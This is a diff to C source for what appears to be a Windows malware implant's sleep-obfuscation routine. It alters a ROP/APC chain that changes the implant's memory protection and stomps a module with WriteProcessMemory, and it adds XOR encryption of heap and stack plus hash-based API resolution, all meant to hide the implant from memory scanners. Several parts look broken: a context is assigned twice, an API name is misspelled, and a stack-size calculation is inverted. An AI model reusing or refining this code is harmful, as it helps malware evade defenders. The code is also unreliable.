@@ -1,5 +1,6 @@
 #include <utils.h>
 #include <common.h>
+#include <constexpr.h>
 
 FUNC VOID volatile ___chkstk_ms(
         VOID
@@ -10,7 +11,6 @@ FUNC VOID SleepMain(
 ) {
     FoliageObf( SleepTime );
 }
-
 #ifdef BK_STOMP
 FUNC VOID FoliageObf( 
     DWORD SleepTime
@@ -39,6 +39,7 @@ FUNC VOID FoliageObf(
     CONTEXT RopImpBcp = { 0 };
     CONTEXT RopProtRw = { 0 };
     CONTEXT RopProtRx = { 0 };
+    CONTEXT RopProtRx2 = { 0 };
     CONTEXT RopExit   = { 0 };
 
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
@@ -83,15 +84,29 @@ FUNC VOID FoliageObf(
      * Change implant protection to RW
      * VirtualProtect( RxBase, RxSize, PAGE_READWRITE, &OldProt ); 
      */
-    RopFreeLb.Rip = Instance()->Win32.FreeLibrary;
-    RopFreeLb.Rcx = hLibraryFr;
+    //RopFreeLb.Rip = Instance()->Win32.LdrUnloadDll;
+    //RopFreeLb.Rcx = hLibraryFr;
 
     /*
      * memory encryption
      * SystemFunction040( BaseAddress, FullLength );
      */
-    RopLoadLb.Rip = Instance()->Win32.LoadLibraryA;
+    RopLoadLb.Rip = Instance()->Win32.LoadLibraryExA;
     RopLoadLb.Rcx = LibraryFr;
+    RopLoadLb.Rdx = NULL;
+    RopLoadLb.R8  = DONT_RESOLVE_DLL_REFERENCES;
+
+    RopFreeLb.Rip = Instance()->Win32.VirtualProtect;
+    RopFreeLb.Rcx = Instance()->Base.RxBase;
+    RopFreeLb.Rdx = Instance()->Base.RxSize;
+    RopFreeLb.R8  = PAGE_READWRITE;
+    RopFreeLb.R9  = &OldProt;
+
+    RopLoadLb.Rip = Instance()->Win32.WriteProcessMemory;
+    RopLoadLb.Rcx = NtCurrentProcess(); 
+    RopLoadLb.Rdx = Instance()->Base.Buffer;
+    RopLoadLb.R8  = Instance()->StompArgs->Backup2;
+    RopLoadLb.R9  = Instance()->Base.FullLen;
 
     /*
      * delay
@@ -99,7 +114,7 @@ FUNC VOID FoliageObf(
      */
     RopDelay.Rip = Instance()->Win32.WaitForSingleObjectEx;
     RopDelay.Rcx = NtCurrentProcess();
-    RopDelay.Rdx = SleepTime;
+    RopDelay.Rdx = 50 * 1000;
     RopDelay.R8  = FALSE;
 
     RopProtRw.Rip = Instance()->Win32.VirtualProtect;
@@ -134,6 +149,7 @@ FUNC VOID FoliageObf(
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopSetEvt, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopFreeLb, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopLoadLb, FALSE, NULL );
+    Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRx2, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopDelay , FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopProtRw, FALSE, NULL );
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopImpBcp, FALSE, NULL );
@@ -145,7 +161,7 @@ FUNC VOID FoliageObf(
         //PrintErr( "NtAlertResumeThread", Status );
     }
 
-    CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
+    //CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
     //CtxSpoof.Rsp = Instance()->Teb->NtTib.StackBase;
 
     Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
@@ -154,8 +170,6 @@ FUNC VOID FoliageObf(
     if ( Status != 0x00 ) {
         //PrintErr( "NtSignalAndWaitForSingleObject", Status );
     }
-
-    //HeapDeobf();
 
 _LeaveObf:
     if ( EvtSync ) {
@@ -169,6 +183,7 @@ _LeaveObf:
     }
 }    
 #else
+
 FUNC VOID FoliageObf( 
     DWORD SleepTime
 ) {
@@ -182,6 +197,7 @@ FUNC VOID FoliageObf(
     HANDLE hMainThread   = NULL;
 
     PVOID  OldProt    = NULL;
+    PVOID  Heap       = Instance()->Session.Heap;
 
     CONTEXT CtxMain   = { 0 };
     CONTEXT CtxBackup = { 0 };
@@ -198,25 +214,29 @@ FUNC VOID FoliageObf(
     CONTEXT RopFixCtx = { 0 }; 
     CONTEXT RopExit   = { 0 };
 
+    typedef NTSTATUS (NTAPI *fNtSignalAndWaitForSingleObject)(
+        HANDLE SignalHandle, HANDLE WaitHandle, 
+        BOOLEAN Alertable, PLARGE_INTEGER Timeout
+    );
+
+    typedef WINBOOL (*fCloseHandle)( HANDLE hObject );
+
+    fNtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject = LdrFuncAddr( LdrModuleAddr( H_MODULE_NTDLL ), HASH_STR( "NtSignalAndWaitForSingleObject" ) );
+    fCloseHandle pCloseHandle = LdrFuncAddr( LdrModuleAddr( H_MODULE_KERNEL32 ), HASH_STR( "CloseHandle" ) );
+
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
-    if ( Status != 0x00 ) {
-        //PrintErr( "NtCreateEvent", Status );
-    }    
+    if ( Status != 0x00 )  { __debugbreak; return; }
 
     Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDuplicateObj, THREAD_ALL_ACCESS, 0, 0 );
 
     Status = Instance()->Win32.NtCreateThreadEx( &hSlpThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL );
-    if ( Status != 0x00 ) {
-        //PrintErr( "NtCreateThreadEx", Status );
-    }
+    if ( Status != 0x00 ) { __debugbreak; return; }
 
     Instance()->Win32.printf( "[I] Obf chain thread at tid: %d\n", hSlpThread );
 
     CtxMain.ContextFlags = CONTEXT_FULL;
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
-    if ( Status != 0x00 ) {
-        //PrintErr( "NtGetContextThread", Status );
-    }
+    if ( Status != 0x00 ) { __debugbreak; return; }
 
     *(PVOID*)CtxMain.Rsp = Instance()->Win32.NtTestAlert;
 
@@ -328,19 +348,15 @@ FUNC VOID FoliageObf(
     Instance()->Win32.NtQueueApcThread( hSlpThread, Instance()->Win32.NtContinue, &RopExit  , FALSE, NULL );
 
     Status = Instance()->Win32.NtAlertResumeThread( hSlpThread, NULL );
-    if ( Status != 0x00 ) {
-        //PrintErr( "NtAlertResumeThread", Status );
-    }
-
-    CtxSpoof.Rip = Instance()->Win32.WaitForSingleObjectEx;
-    //CtxSpoof.Rsp = Instance()->Teb->NtTib.StackBase;
-
+    if ( Status != 0x00 ) { __debugbreak; return; }
     Instance()->Win32.printf( "[I] Trigger sleep obf chain\n\n" );
 
-    Status = Instance()->Win32.NtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
-    if ( Status != 0x00 ) {
-        //PrintErr( "NtSignalAndWaitForSingleObject", Status );
-    }
+    HeapObf( Heap );
+
+    Status = pNtSignalAndWaitForSingleObject( EvtSync, hSlpThread, FALSE, NULL );
+    if ( Status != 0x00 ) { __debugbreak; return; }
+
+    HeapObf( Heap );
 
 _LeaveObf:
     if ( EvtSync ) {
@@ -353,6 +369,7 @@ _LeaveObf:
         hSlpThread = NULL;
     }
 }    
+
 #endif
 
 FUNC BOOL CfgCheckEnabled(
@@ -462,10 +479,10 @@ FUNC VOID CfgPrivateAddressAdd(
 }
 
 FUNC VOID XorCipher(
-    IN PBYTE pBinary, 
-    IN SIZE_T sSize, 
-    IN PBYTE pbKey, 
-    IN SIZE_T sKeySize
+    _In_ PBYTE  pBinary, 
+    _In_ UINT64 sSize, 
+    _In_ PBYTE  pbKey, 
+    _In_ UINT64 sKeySize
 ) {
     for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
         if (j == sKeySize)
@@ -478,8 +495,8 @@ FUNC VOID XorCipher(
     }
 }
 
-FUNC BOOL HeapObf( 
-    void
+FUNC VOID HeapObf( 
+    PVOID Heap
 ) {
     BLACKOUT_INSTANCE
 
@@ -488,25 +505,25 @@ FUNC BOOL HeapObf(
 
     MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );
 
-    Instance()->Win32.HeapWalk( Instance()->Session.Heap, &HeapEntry );
+    typedef WINBOOL (*fHeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
+    fHeapWalk pHeapWalk = LdrFuncAddr( LdrModuleAddr( H_MODULE_KERNEL32 ), HASH_STR( "HeapWWalk" ) );
+
+    pHeapWalk( Heap, &HeapEntry );
     if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
-        Instance()->Win32.printf( "[I] block %p [%d bytes]\n", HeapEntry.lpData, HeapEntry.cbData );
         XorCipher( HeapEntry.lpData, HeapEntry.cbData, HeapKey, sizeof(HeapKey) );
-    }   
+    }
 }
 
-FUNC BOOL HeapDeobf( 
-    void
+FUNC VOID StackObf(
+    VOID
 ) {
     BLACKOUT_INSTANCE
 
-    PROCESS_HEAP_ENTRY HeapEntry = { 0 };
+    BYTE   StackKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
 
-    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );
+    PVOID  StackBase  = Instance()->Teb->NtTib.StackBase;
+    PVOID  StackLimit = Instance()->Teb->NtTib.StackLimit;
+    UINT64 StackSize  = C_U64( StackLimit - C_U64( StackBase ) );
 
-    while( Instance()->Win32.HeapWalk( Instance()->Session.Heap, &HeapEntry ) ){
-        if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
-            Instance()->Win32.SystemFunction041( HeapEntry.lpData, HeapEntry.cbData, 0 );
-        }
-    } 
+    XorCipher( StackBase, StackSize, StackKey, sizeof( StackKey ) );
 }
